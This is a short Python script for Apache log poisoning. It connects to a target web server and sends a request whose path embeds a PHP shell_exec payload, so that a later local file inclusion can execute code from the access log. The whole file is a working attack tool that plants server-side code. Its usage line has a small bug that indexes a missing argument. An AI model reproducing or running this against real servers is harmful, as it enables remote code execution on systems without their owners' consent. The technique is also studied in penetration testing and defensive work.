#!/usr/bin/python
import socket, sys

#This script, taints the application log file, and then if you find a LFI vulnerability, you can test the code from apache's access log.

if len(sys.argv) != 2:
  print"(+) usage %s <target>"% sys.argv[1]
  sys.exit(-1)
  
taint="GET /<?php echo shell_exec('id');?> HTTP/1.1\r\n\r\n"
s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
s.connect((sys.argv[1],80))
s.send(taint)
s.close()
